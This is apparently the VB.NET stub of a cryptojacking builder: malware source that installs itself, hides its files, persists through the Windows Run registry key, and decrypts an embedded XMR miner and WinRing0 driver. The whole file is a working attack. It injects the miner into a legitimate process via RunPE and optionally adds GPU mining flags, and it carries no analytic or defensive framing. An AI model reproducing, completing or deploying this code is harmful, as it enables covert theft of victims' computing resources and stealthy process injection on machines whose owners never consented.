Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const Assembly = False
#Const INS = False
#Const EnableGPU = False

#If Assembly Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If

Public Class Program
    Public Shared IH As Boolean = False

    Public Shared Sub Main()
#If INS Then
        Install()
#End If
        KillLastProc()
        Initialize()
    End Sub



#If INS Then
    Public Shared Sub Install()
        Thread.Sleep(2 * 1000)
        Try
            If Process.GetCurrentProcess.MainModule.FileName <> PayloadPath Then
                For Each P As Process In Process.GetProcesses
                    Try
                        If P.MainModule.FileName = PayloadPath Then
                            P.Kill()
                        End If
                    Catch : End Try
                Next
                Using Drop As New FileStream(PayloadPath, FileMode.Create)
                    Dim Client As Byte() = File.ReadAllBytes(Process.GetCurrentProcess.MainModule.FileName)
                    Drop.Write(Client, 0, Client.Length)
                End Using
                If IH Then
                    IO.File.SetAttributes(PayloadPath, IO.FileAttributes.Hidden Or IO.FileAttributes.System)
                End If
                Thread.Sleep(2 * 1000)
                Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(PayloadPath), PayloadPath)
                Process.Start(PayloadPath)
                Environment.Exit(0)
            End If
        Catch ex As Exception
        End Try
    End Sub
#End If

    Public Shared Function GetTheResource(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("#ParentRes", MyAssembly)
        Return AES_Decryptor(MyResource.GetObject(Get_))
    End Function

    Public Shared Function GetString(ByVal input As String)
        Return Encoding.ASCII.GetString(AES_Decryptor(Convert.FromBase64String(input)))
    End Function

    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
        'Credits gigajew for RunPE https://github.com/gigajew/WinXRunPE-x86_x64
        Try
            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, GetString("#InjectionDir") & "\" & GetString("#InjectionTarget"), arg})
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub KillLastProc()
        On Error Resume Next
        Dim objWMIService = GetObject("winmgmts: " & "{impersonationLevel=impersonate}!\\" & Environment.UserDomainName & "\root\cimv2")
        Dim colProcess = objWMIService.ExecQuery("Select * from Win32_Process")
        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", GetString("#InjectionTarget"))
        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
        For Each retObject As Object In colProcess
            If retObject.CommandLine.ToString.Contains("--don") Then
                retObject.Terminate()
            End If
        Next
    End Sub

    Public Shared Sub Initialize()
        If IsNumeric("#STARTDELAY") AndAlso CInt("#STARTDELAY") > 0 Then
            Threading.Thread.Sleep(CInt("#STARTDELAY") * 1000)
        End If

        Try
            Dim x As Byte() = GetTheResource("#xmr")
            Dim xm As Byte() = New Byte() {}
            Dim wr As Byte() = GetTheResource("#winring")
            Dim lb As String = GetString("#LIBSPATH")
            Dim EnableRemovalDate = GetString("#EnableAutoRemoval")
            Dim todaysdate As DateTime = DateTime.Now
            Dim RemovalDate As String = GetString("#RemovalDate")
            If (RemovalDate IsNot "None") Then
                Dim RemovalDateAsTime As DateTime = Convert.ToDateTime(RemovalDate)
                If (EnableRemovalDate = "True") Then
                    If (todaysdate > RemovalDateAsTime) Then
                        'Start the removal'
                    End If
                End If

            End If

            Dim bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb
            Dim rS As String = ""

            Try
                System.IO.Directory.CreateDirectory(bD)
                Dim DirInfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb.Split(New Char() {"\"c})(0))
                DirInfo.Attributes = FileAttributes.System Or FileAttributes.Hidden
                My.Computer.FileSystem.WriteAllBytes(bD & "WR64.sys", wr, False)

                Using archive As ZipArchive = New ZipArchive(New MemoryStream(x))
                    For Each entry As ZipArchiveEntry In archive.Entries
                        If entry.FullName.Contains("xm") Then
                            Using streamdata As Stream = entry.Open()
                                Using ms = New MemoryStream()
                                    streamdata.CopyTo(ms)
                                    xm = ms.ToArray
                                End Using
                            End Using
                        End If
                    Next
                End Using

#If EnableGPU Then
            Dim GPUstr as String = GetGPU
            If GPUstr.ToLower.Contains("nvidia") OrElse GPUstr.ToLower.Contains("amd") Then
                Try
                    Dim libs As Byte() = GetTheResource("#libs")
                    Using archive As ZipArchive = New ZipArchive(New MemoryStream(libs))
                        For Each entry As ZipArchiveEntry In archive.Entries
                            entry.ExtractToFile(Path.Combine(bD, entry.FullName), True)
                        Next
                    End Using

                    If GPUstr.ToLower.Contains("nvidia") Then
                        rS += " --cuda --cuda-loader=" + ControlChars.Quote + bD + "ddb64.dll" + ControlChars.Quote
                    End If

                    If GPUstr.ToLower.Contains("amd") Then
                        rS += " --opencl "
                    End If

                Catch ex As Exception
                End Try
            End If
#End If
            Catch ex As Exception
            End Try
            Run(GetTheResource("#dll"), GetString("#ARGSTR") + rS, xm)
        Catch ex As Exception
        End Try
    End Sub

#If EnableGPU Then
    Public Shared Function GetGPU() As String
        Try
            Dim VideoCard As String = ""
            Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
            Dim objSearcher As New System.Management.ManagementObjectSearcher(objquery)

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("VideoProcessor")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If

            For Each MemObj As System.Management.ManagementObject In objSearcher.Get
                VideoCard = VideoCard & (MemObj("Name")) & " "
            Next

            If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                Return VideoCard
            End If
            Return ""
        Catch ex As Exception
            Return ""
        End Try
    End Function
#End If

    Public Shared Function AES_Decryptor(ByVal input As Byte()) As Byte()
        Dim AES As New RijndaelManaged
        Dim Hash_ As New MD5CryptoServiceProvider
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_.ComputeHash(System.Text.Encoding.ASCII.GetBytes("#KEY"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
            Dim Buffer As Byte() = input
            Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
        Catch ex As Exception
        End Try
    End Function

End Class
